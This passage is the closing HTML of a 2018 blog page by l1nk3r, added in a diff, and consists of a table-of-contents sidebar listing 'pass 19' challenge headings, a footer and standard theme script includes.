class="nav-text">解题方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-19"><span class="nav-text">pass 19</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析-18"><span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题办法-2"><span class="nav-text">解题办法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-总结"><span class="nav-text">0x03 总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Refer"><span class="nav-text">Refer</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">l1nk3r</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
